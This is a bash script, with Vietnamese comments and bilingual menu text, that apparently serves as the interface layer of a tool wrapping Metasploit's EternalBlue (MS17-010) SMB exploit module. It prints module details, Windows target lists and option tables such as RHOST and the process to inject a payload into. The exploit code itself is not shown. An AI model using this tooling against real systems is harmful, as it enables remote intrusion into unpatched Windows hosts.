function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: MS17-010 | Lỗ hổng thực thi mã từ xa Windows SMB
     Mô-đun: exploit/windows/smb/ms17_010_eternalblue_allwin
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Có
    Loại mã: Metasploit(Ruby)
    Công bố: 14/03/2017

Cung cấp bởi:
  Worawit Wang (https://github.com/worawit)
  cclauss (https://github.com/cclauss)
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  Equation Group
  Shadow Brokers
  thelightcosine
  Pascal3366 (https://github.com/Pascal3366)
!
platform
cat << !

Mục tiêu khả dụng:

   Id  Tên
   --  ----
   0   Windows 2016 x64
   1   Windows 10 Pro Build 10240 x64
   2   Windows 10 Pro x64
   3   Windows 10 Home x64
   4   Windows 10 Enterprise x64
   5   Windows 10 Education x64
   6   Windows 2012 R2 x64
   7   Windows 8.1 x64
   8   Windows 2008 R2 SP1 x64
   9   Windows 7 SP1 x64
   10  Windows 2008 SP1 x64
   11  Windows 2003 R2 SP2 x64
   12  Windows XP SP2 x64
   13  Windows 8.1 x86
   14  Windows 7 SP1 x86
   15  Windows 2008 SP1 x86
   16  Windows 2003 SP2 x86
   17  Windows XP SP3 x86
   18  Windows 2000 SP4 x86
!
module_compare
cat << !
Hỗ trợ quét lỗ hổng:
   Có

Miêu tả:
#description

Tham khảo:
   https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
   https://cvedetails.com/cve/CVE-2017-0143/
   https://cvedetails.com/cve/CVE-2017-0144/
   https://cvedetails.com/cve/CVE-2017-0145/
   https://cvedetails.com/cve/CVE-2017-0146/
   https://cvedetails.com/cve/CVE-2017-0147/
   https://cvedetails.com/cve/CVE-2017-0148/
   https://github.com/worawit/MS17-010
   https://github.com/Pascal3366/MS17-010-EternalBlue-WinXP-Win10

Còn được biết là:
   EternalBlue DoublePulsar

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: MS17-010 | Windows SMB Remote Code Execution Vulnerability
     Module: exploit/windows/smb/ms17_010_eternalblue_allwin
   Platform: Windows
       Arch: x86, x64
 Privileged: Yes
  Code type: Metasploit(Ruby)
  Disclosed: 14/03/2017

Provided by:
  Worawit Wang (https://github.com/worawit)
  cclauss (https://github.com/cclauss)
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  Equation Group
  Shadow Brokers
  thelightcosine
  Pascal3366 (https://github.com/Pascal3366)
!
platform
cat << !

Available targets:

   Id  Name
   --  ----
   0   Windows 2016 x64
   1   Windows 10 Pro Build 10240 x64
   2   Windows 10 Pro x64
   3   Windows 10 Home x64
   4   Windows 10 Enterprise x64
   5   Windows 10 Education x64
   6   Windows 2012 R2 x64
   7   Windows 8.1 x64
   8   Windows 2008 R2 SP1 x64
   9   Windows 7 SP1 x64
   10  Windows 2008 SP1 x64
   11  Windows 2003 R2 SP2 x64
   12  Windows XP SP2 x64
   13  Windows 8.1 x86
   14  Windows 7 SP1 x86
   15  Windows 2008 SP1 x86
   16  Windows 2003 SP2 x86
   17  Windows XP SP3 x86
   18  Windows 2000 SP4 x86
!
module_compare
cat << !
Vulnerability scanning support:
   Yes

Description:
#description

References:
   https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
   https://cvedetails.com/cve/CVE-2017-0143/
   https://cvedetails.com/cve/CVE-2017-0144/
   https://cvedetails.com/cve/CVE-2017-0145/
   https://cvedetails.com/cve/CVE-2017-0146/
   https://cvedetails.com/cve/CVE-2017-0147/
   https://cvedetails.com/cve/CVE-2017-0148/
   https://github.com/worawit/MS17-010
   https://github.com/Pascal3366/MS17-010-EternalBlue-WinXP-Win10

Also known as:
   EternalBlue DoublePulsar

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	platform="msf"
	vuln_path=`pwd`
	config_file="$vuln_path/Config/config-file"
	rm -rf $config_file > /dev/null 2>&1
	touch $config_file > /dev/null 2>&1
	rhost=""
	rport="445"
	groomallocations="12"
	groomdelta="5"
	maxexploitattempts="5"
	processname="spoolsv.exe"
	smbdomain="."
	smbpass=""
	smbuser=""
	verifyarch="true"
	verifytarget="true"
	target="0"
	smbdomain_lenght=18
	rhost_lenght=18
	smbpass_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"  
_characters1="-"
_characters2="-"
################## nếu biến có độ dài nhỏ hơn 18 thì vẫn lấy giá trị 18 ###############
if [[ $rhost_lenght -le 18 ]]; then
 	rhost_lenght=18
fi
if [[ $smbdomain_lenght -le 18 ]]; then
	smbdomain_lenght=18
fi
if [[ $smbpass_lenght -le 18 ]]; then
	smbpass_lenght=18
fi
plus_strings=`expr $smbdomain_lenght + $rhost_lenght + $smbpass_lenght`
if  [[ "$plus_strings" -le 54 ]]; then
	module1
else
	module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
	if [[ "$new_processing_variables" = "platform" ]] || [[ "$new_processing_variables" = "PLATFORM" ]] || [[ "$new_processing_variables" = "Platform" ]]; then
		if [[ "$module_set" = "msf" ]] || [[ "$module_set" = "MSF" ]] || [[ "$module_set" = "Msf" ]] || [[ "$module_set" = "metasploit" ]] || [[ "$module_set" = "Metasploit" ]] || [[ "$module_set" = "1" ]]; then
			unset platform
			platform="$module_set"
		else  failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
			echo -e "$red[-]$RESET" $failed_to_validate
		fi
	elif [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
		unset rhost
		rhost="$module_set"
		rhost_lenght=`echo $rhost | awk '{print length}'`
		if [[ $rhost_lenght -le 18 ]]; then
			rhost_lenght=18
		fi
	elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
		unset rport
		rport="$module_set"
	elif [[ "$new_processing_variables" = "groomallocations" ]] || [[ "$new_processing_variables" = "GROOMALLOCATIONS" ]] || [[ "$new_processing_variables" = "Groomallocations" ]] || [[ "$new_processing_variables" = "GroomAllocations" ]]; then
		unset groomallocations
		groomallocations="$module_set"
	elif [[ "$new_processing_variables" = "groomdelta" ]] || [[ "$new_processing_variables" = "GROOMDELTA" ]] || [[ "$new_processing_variables" = "Groomdelta" ]] || [[ "$new_processing_variables" = "GroomDelta" ]]; then
		unset groomdelta
		groomdelta="$module_set"
	elif [[ "$new_processing_variables" = "maxexploitattempts" ]] || [[ "$new_processing_variables" = "MAXEXPLOITATTEMPTS" ]] || [[ "$new_processing_variables" = "Maxexploitattempts" ]] || [[ "$new_processing_variables" = "MaxExploitAttempts" ]]; then
		unset maxexploitattempts
		maxexploitattempts="$module_set"
	elif [[ "$new_processing_variables" = "processname" ]] || [[ "$new_processing_variables" = "PROCESSNAME" ]] || [[ "$new_processing_variables" = "Processname" ]] || [[ "$new_processing_variables" = "ProcessName" ]]; then
		unset processname
		processname="$module_set"
	elif [[ "$new_processing_variables" = "smbdomain" ]] || [[ "$new_processing_variables" = "SMBDOMAIN" ]] || [[ "$new_processing_variables" = "Smbdomain" ]] || [[ "$new_processing_variables" = "SMBDomain" ]]; then
		unset smbdomain
		smbdomain="$module_set"
	elif [[ "$new_processing_variables" = "smbpass" ]] || [[ "$new_processing_variables" = "SMBPASS" ]] || [[ "$new_processing_variables" = "Smbpass" ]] || [[ "$new_processing_variables" = "SMBPass" ]]; then
		unset smbpass
		smbpass="$module_set"
	elif [[ "$new_processing_variables" = "smbuser" ]] || [[ "$new_processing_variables" = "SMBUSER" ]] || [[ "$new_processing_variables" = "Smbuser" ]] || [[ "$new_processing_variables" = "SMBUser" ]]; then
		unset smbuser
		smbuser="$module_set"
	elif [[ "$new_processing_variables" = "verifyarch" ]] || [[ "$new_processing_variables" = "VERIFYARCH" ]] || [[ "$new_processing_variables" = "Verifyarch" ]] || [[ "$new_processing_variables" = "VerifyArch" ]]; then
		unset verifyarch
		verifyarch="$module_set"
	elif [[ "$new_processing_variables" = "verifytarget" ]] || [[ "$new_processing_variables" = "VERIFYTARGET" ]] || [[ "$new_processing_variables" = "Verifytarget" ]] || [[ "$new_processing_variables" = "VerifyTarget" ]]; then
		unset verifytarget
		verifytarget="$module_set"
	elif [[ "$new_processing_variables" = "target" ]] || [[ "$new_processing_variables" = "TARGET" ]] || [[ "$new_processing_variables" = "Target" ]]; then
		if [[ "$module_set" = "0" ]] || [[ "$module_set" = "1" ]] || [[ "$module_set" = "2" ]] || [[ "$module_set" = "3" ]] || [[ "$module_set" = "4" ]] || [[ "$module_set" = "5" ]] || [[ "$module_set" = "6" ]] || [[ "$module_set" = "7" ]] || [[ "$module_set" = "8" ]] || [[ "$module_set" = "9" ]] || [[ "$module_set" = "10" ]] || [[ "$module_set" = "11" ]] || [[ "$module_set" = "12" ]] || [[ "$module_set" = "13" ]] || [[ "$module_set" = "14" ]] || [[ "$module_set" = "15" ]] || [[ "$module_set" = "16" ]] || [[ "$module_set" = "17" ]] || [[ "$module_set" = "18" ]]; then
			unset target
			target="$module_set"
		else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
			echo -e "$red[-]$RESET" $failed_to_validate
		fi
	fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
  function unset_value {
    unset none
    unset myvar
    unset integer
    none=" "
    myvar=""
  }
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
  integer=`expr 20 - $rhost_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  rhost=$rhost$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
  integer=`expr 20 - $rport_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  rport=$rport$myvar
unset_value
groomallocations=`echo $groomallocations`
groomallocations_lenght=`echo $groomallocations | awk '{print length}'`
  integer=`expr 20 - $groomallocations_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  groomallocations=$groomallocations$myvar
unset_value
groomdelta=`echo $groomdelta`
groomdelta_lenght=`echo $groomdelta | awk '{print length}'`
  integer=`expr 20 - $groomdelta_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  groomdelta=$groomdelta$myvar
unset_value
maxexploitattempts=`echo $maxexploitattempts`
maxexploitattempts_lenght=`echo $maxexploitattempts | awk '{print length}'`
  integer=`expr 20 - $maxexploitattempts_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  maxexploitattempts=$maxexploitattempts$myvar
unset_value
processname=`echo $processname`
processname_lenght=`echo $processname | awk '{print length}'`
  integer=`expr 20 - $processname_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  processname=$processname$myvar
unset_value
smbdomain=`echo $smbdomain`
smbdomain_lenght=`echo $smbdomain | awk '{print length}'`
  integer=`expr 20 - $smbdomain_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  smbdomain=$smbdomain$myvar
unset_value
smbpass=`echo $smbpass`
smbpass_lenght=`echo $smbpass | awk '{print length}'`
  integer=`expr 20 - $smbpass_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  smbpass=$smbpass$myvar
unset_value
smbuser=`echo $smbuser`
smbuser_lenght=`echo $smbuser | awk '{print length}'`
  integer=`expr 20 - $smbuser_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  smbuser=$smbuser$myvar
unset_value
verifyarch=`echo $verifyarch`
verifyarch_lenght=`echo $verifyarch | awk '{print length}'`
  integer=`expr 20 - $verifyarch_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  verifyarch=$verifyarch$myvar
unset_value
verifytarget=`echo $verifytarget`
verifytarget_lenght=`echo $verifytarget | awk '{print length}'`
  integer=`expr 20 - $verifytarget_lenght`     
  for (( i = 0 ; i < $integer; i++ )) do
    myvar=$myvar$none
  done
  verifytarget=$verifytarget$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
  function unset_value {
    unset none
    unset myvar
    unset subtract_compare_value
    none=" "
    myvar=""
  }
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
smbdomain=`echo $smbdomain`
smbdomain_lenght=`echo $smbdomain | awk '{print length}'`
smbpass=`echo $smbpass`
smbpass_lenght=`echo $smbpass | awk '{print length}'`
subtract_compare1=`expr $smbpass_lenght - $smbdomain_lenght`
subtract_compare2=`expr $rhost_lenght - $smbdomain_lenght`
subtract_compare3=`expr $rhost_lenght - $smbpass_lenght`

if [[ $subtract_compare1 -gt 0 ]]; then
	if [[ $subtract_compare3 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		smbpass=$smbpass$myvar
	unset_value
		subtract_compare_value=`expr $smbpass_lenght - $smbdomain_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbdomain=$smbdomain$myvar
	unset_value
		subtract_compare_value=`expr $smbpass_lenght - $rhost_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		rhost=$rhost$myvar
	unset_value
		greater_value=$smbpass_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		rhost=$rhost$myvar
	unset_value
		subtract_compare_value=`expr $rhost_lenght - $smbpass_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbpass=$smbpass$myvar
	unset_value
		subtract_compare_value=`expr $rhost_lenght - $smbdomain_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbdomain=$smbdomain$myvar
	unset_value
	
		greater_value=$rhost_lenght
	fi
elif [[ $subtract_compare2 -gt 0 ]]; then
	if [[ $subtract_compare3 -gt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		rhost=$rhost$myvar
	unset_value
		subtract_compare_value=`expr $rhost_lenght - $smbdomain_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbdomain=$smbdomain$myvar
	unset_value
		subtract_compare_value=`expr $rhost_lenght - $smbpass_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbpass=$smbpass$myvar
	unset_value
		greater_value=$rhost_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		smbpass=$smbpass$myvar
	unset_value
		subtract_compare_value=`expr $smbpass_lenght - $rhost_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		rhost=$rhost$myvar
	unset_value
		subtract_compare_value=`expr $smbpass_lenght - $smbdomain_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbdomain=$smbdomain$myvar
	unset_value
	
		greater_value=$smbpass_lenght
	fi
else
	if [[ $subtract_compare2 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		smbdomain=$smbdomain$myvar
	unset_value
		subtract_compare_value=`expr $smbdomain_lenght - $rhost_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		rhost=$rhost$myvar
	unset_value
		subtract_compare_value=`expr $smbdomain_lenght - $smbpass_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbpass=$smbpass$myvar
	unset_value
		greater_value=$smbdomain_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		rhost=$rhost$myvar
	unset_value
		subtract_compare_value=`expr $rhost_lenght - $smbpass_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbpass=$smbpass$myvar
	unset_value
		subtract_compare_value=`expr $rhost_lenght - $smbdomain_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		smbdomain=$smbdomain$myvar
	unset_value
		greater_value=$rhost_lenght
	fi
fi
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rport_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  rport=$rport$myvar
unset_value
groomallocations=`echo $groomallocations`
groomallocations_lenght=`echo $groomallocations | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $groomallocations_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  groomallocations=$groomallocations$myvar
unset_value
groomdelta=`echo $groomdelta`
groomdelta_lenght=`echo $groomdelta | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $groomdelta_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  groomdelta=$groomdelta$myvar
unset_value
maxexploitattempts=`echo $maxexploitattempts`
maxexploitattempts_lenght=`echo $maxexploitattempts | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $maxexploitattempts_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  maxexploitattempts=$maxexploitattempts$myvar
unset_value
processname=`echo $processname`
processname_lenght=`echo $processname | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $processname_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  processname=$processname$myvar
unset_value
smbuser=`echo $smbuser`
smbuser_lenght=`echo $smbuser | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $smbuser_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  smbuser=$smbuser$myvar
unset_value
verifyarch=`echo $verifyarch`
verifyarch_lenght=`echo $verifyarch | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $verifyarch_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  verifyarch=$verifyarch$myvar
unset_value
verifytarget=`echo $verifytarget`
verifytarget_lenght=`echo $verifytarget | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $verifytarget_lenght + 3`  
  for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  verifytarget=$verifytarget$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 15 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  _characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 14 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
    myvar=$myvar$none
  done
  _characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="   Có"
no="   Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/ms17_010_eternalblue_allwin):

   Tên                 Thiết lập hiện tại     Yêu cầu   Miêu tả
   ----                ---------------        --------  -----------
   RHOST               $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT               $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   GroomAllocations    $groomallocations $yes       Số lần ban đầu để chải chuốt (groom) nhân kernel.
   GroomDelta          $groomdelta $yes       Lượng tăng groom sau mỗi lần thử khai thác.
   MaxExploitAttempts  $maxexploitattempts $yes       Số lần thử lại khai thác.
   ProcessName         $processname $yes         Tiến trình để bơm tải trọng vào.
   SMBDomain           $smbdomain $no    (Tùy chọn) Tên miền Windows sử dụng để xác thực.
   SMBUser             $smbuser $no    (Tùy chọn) Tên người dùng smb để xác thực.
   SMBPass             $smbpass $no     (Tùy chọn) Mật khẩu cho tên người dùng được chỉ định.
   VerifyArch          $verifyarch $no     Kiểm tra xem kiến trúc mục tiêu phù hợp với khai thác.
   VerifyTarget        $verifytarget $no    Kiểm tra xem hệ điều hành mục tiêu có khớp với khai thác không.

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/smb/ms17_010_eternalblue_allwin):

   Name                Current Setting       Required  Description
   ----                ---------------       --------  -----------
   RHOST               $rhost $yes      Address or domain name of target server.
   RPORT               $rport $no      The SMB server service port is running.
   GroomAllocations    $groomallocations $yes      Initial number of times to groom the kernel pool.
   GroomDelta          $groomdelta $yes      The amount to increase the groom count by per try.
   MaxExploitAttempts  $maxexploitattempts $yes      The number of times to retry the exploit.
   ProcessName         $processname $yes      Process to inject payload into.
   SMBDomain           $smbdomain $no      (Optional) The Windows domain to use for authentication.
   SMBUser             $smbuser $no      (Optional) The Username to authenticate as.
   SMBPass             $smbpass $no      (Optional) The Password for the specified username.
   VerifyArch          $verifyarch $no      Check if remote architecture matches exploit Target.
   VerifyTarget        $verifytarget $no      Check if remote OS matches exploit Target.

!
fi
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/ms17_010_eternalblue_allwin):

   Tên                 Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----                ---------------${_characters1}--------  -----------
   RHOST               $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT               $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   GroomAllocations    $groomallocations $yes       Số lần ban đầu để chải chuốt (groom) nhân kernel.
   GroomDelta          $groomdelta $yes       Lượng tăng groom sau mỗi lần thử khai thác.
   MaxExploitAttempts  $maxexploitattempts $yes       Số lần thử lại khai thác.
   ProcessName         $processname $yes       Tiến trình để bơm tải trọng vào.
   SMBDomain           $smbdomain $no    (Tùy chọn) Tên miền Windows sử dụng để xác thực.
   SMBUser             $smbuser $no    (Tùy chọn) Tên người dùng smb để xác thực.
   SMBPass             $smbpass $no    (Tùy chọn) Mật khẩu cho tên người dùng được chỉ định.
   VerifyArch          $verifyarch $no    Kiểm tra xem kiến trúc mục tiêu phù hợp với khai thác.
   VerifyTarget        $verifytarget $no    Kiểm tra xem hệ điều hành mục tiêu có khớp với khai thác không.

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/smb/ms17_010_eternalblue_allwin):

   Name                Current Setting${g_characters}Required  Description
   ----                ---------------${_characters2}--------  -----------
   RHOST               $rhost $yes      Address or domain name of target server.
   RPORT               $rport $no      The SMB server service port is running.
   GroomAllocations    $groomallocations $yes      Initial number of times to groom the kernel pool.
   GroomDelta          $groomdelta $yes      The amount to increase the groom count by per try.
   MaxExploitAttempts  $maxexploitattempts $yes      The number of times to retry the exploit.
   ProcessName         $processname $yes      Process to inject payload into.
   SMBDomain           $smbdomain $no      (Optional) The Windows domain to use for authentication.
   SMBUser             $smbuser $no      (Optional) The Username to authenticate as.
   SMBPass             $smbpass $no      (Optional) The Password for the specified username.
   VerifyArch          $verifyarch $no      Check if remote architecture matches exploit Target.
   VerifyTarget        $verifytarget $no      Check if remote OS matches exploit Target.

!
fi
    
}
function show_platforms {
if [ "$language" = "VN" ]; then
echo -e """
Nền tảng mã khai thác:

   Id  Tên
   --  ----
   0   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
elif [ "$language" = "EN" ]; then
echo -e """
Exploit code platform:

   Id  Name
   --  ----
   0   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
fi
}
function platform {
if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   0   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   0   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
fi
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !

Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   0   Windows 2016 x64
   1   Windows 10 Pro Build 10240 x64
   2   Windows 10 Pro x64
   3   Windows 10 Home x64
   4   Windows 10 Enterprise x64
   5   Windows 10 Education x64
   6   Windows 2012 R2 x64
   7   Windows 8.1 x64
   8   Windows 2008 R2 SP1 x64
   9   Windows 7 SP1 x64
   10  Windows 2008 SP1 x64
   11  Windows 2003 R2 SP2 x64
   12  Windows XP SP2 x64
   13  Windows 8.1 x86
   14  Windows 7 SP1 x86
   15  Windows 2008 SP1 x86
   16  Windows 2003 SP2 x86
   17  Windows XP SP3 x86
   18  Windows 2000 SP4 x86

!
elif [ "$language" = "EN" ]; then
cat << !

Exploit targets:

   Id  Name
   --  ----
   0   Windows 2016 x64
   1   Windows 10 Pro Build 10240 x64
   2   Windows 10 Pro x64
   3   Windows 10 Home x64
   4   Windows 10 Enterprise x64
   5   Windows 10 Education x64
   6   Windows 2012 R2 x64
   7   Windows 8.1 x64
   8   Windows 2008 R2 SP1 x64
   9   Windows 7 SP1 x64
   10  Windows 2008 SP1 x64
   11  Windows 2003 R2 SP2 x64
   12  Windows XP SP2 x64
   13  Windows 8.1 x86
   14  Windows 7 SP1 x86
   15  Windows 2008 SP1 x86
   16  Windows 2003 SP2 x86
   17  Windows XP SP3 x86
   18  Windows 2000 SP4 x86

!
fi
}

function target {
if [ "$language" = "VN" ]; then
	if [ "$target" = "0" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   0   Windows 2016 x64

!
	elif [ "$target" = "1" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   1   Windows 10 Pro Build 10240 x64

!
	elif [ "$target" = "2" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   2   Windows 10 Pro x64

!
	elif [ "$target" = "3" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   3   Windows 10 Home x64

!
	elif [ "$target" = "4" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   4   Windows 10 Enterprise x64

!
	elif [ "$target" = "5" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   5   Windows 10 Education x64

!
	elif [ "$target" = "6" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   6   Windows 2012 R2 x64

!
	elif [ "$target" = "7" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   7   Windows 8.1 x64

!
	elif [ "$target" = "8" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   8   Windows 2008 R2 SP1 x64

!
	elif [ "$target" = "9" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   9   Windows 7 SP1 x64

!
	elif [ "$target" = "10" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   10  Windows 2008 SP1 x64

!
	elif [ "$target" = "11" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   11  Windows 2003 R2 SP2 x64

!
	elif [ "$target" = "12" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   12  Windows XP SP2 x64

!
	elif [ "$target" = "13" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   13  Windows 8.1 x86

!
	elif [ "$target" = "14" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   14  Windows 7 SP1 x86

!
	elif [ "$target" = "15" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   15  Windows 2008 SP1 x86

!
	elif [ "$target" = "16" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   16  Windows 2003 SP2 x86

!
	elif [ "$target" = "17" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   17  Windows XP SP3 x86

!
	elif [ "$target" = "18" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   18  Windows 2000 SP4 x86

!
	fi
elif [ "$language" = "EN" ]; then
	if [ "$target" = "0" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   0   Windows 2016 x64

!
	elif [ "$target" = "1" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   1   Windows 10 Pro Build 10240 x64

!
	elif [ "$target" = "2" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   2   Windows 10 Pro x64

!
	elif [ "$target" = "3" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   3   Windows 10 Home x64

!
	elif [ "$target" = "4" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   4   Windows 10 Enterprise x64

!
	elif [ "$target" = "5" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   5   Windows 10 Education x64

!
	elif [ "$target" = "6" ]; then
cat << !
Exploit target:

   Id  Name
